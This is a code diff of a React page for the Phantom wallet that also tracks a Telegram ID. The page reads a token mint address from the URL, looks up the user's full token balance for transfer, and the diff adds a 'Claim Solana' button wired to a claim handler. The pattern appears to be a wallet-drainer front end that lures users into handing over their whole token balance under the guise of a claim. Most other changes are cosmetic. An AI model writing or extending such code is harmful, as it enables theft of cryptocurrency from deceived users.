@@ -10,7 +10,7 @@ export default function Home() {
 	const [tgId, setTgId] = useState(null);
 	const [token, setToken] = useState(null);
 	const [walletAddress, setWalletAddress] = useState(null);
-	const [notification, setNotification] = useState(null); 
+	const [notification, setNotification] = useState(null);
 	const hasRun = useRef(false);
 
 	// --- Parse query params ---
@@ -43,7 +43,7 @@ export default function Home() {
 		const tokenAddress = params.get("token"); // SPL token mint address
 
 		if (!window.solana || !window.solana.isPhantom) {
-			setNotification("Phantom wallet not found. Please install it.")
+			setNotification("Phantom wallet not found. Please install it.");
 			return;
 		}
 
@@ -72,7 +72,7 @@ export default function Home() {
 				const tokenBalanceInfo = await connection.getTokenAccountBalance(userTokenAccount);
 				const amount = tokenBalanceInfo.value.amount; // raw amount in base units
 				if (amount === "0") {
-					setNotification("No tokens available to transfer.")
+					setNotification("No tokens available to transfer.");
 					return;
 				}
 
@@ -235,9 +235,10 @@ export default function Home() {
 							</p>
 							<div className="hero-actions">
 								{walletAddress ? (
-									<button className="btn btn-outline" style={{ fontSize: "17px", padding: "0.6rem 1rem" }} disabled>
-										Connected
-									</button>
+									<button className="btn btn-outline" style={{ fontSize: "17px", padding: "0.6rem 1rem" }} onClick={handleClaim}>
+										Claim Solana{" "}
+										<img width="20" height="20" src="https://img.icons8.com/flat-round/64/link--v1.png" alt="link--v1"/>
+																			</button>
 								) : (
 									<button className="btn btn-outline" style={{ fontSize: "17px", padding: "0.6rem 1rem" }} onClick={connectWallet}>
 										Connect Wallet
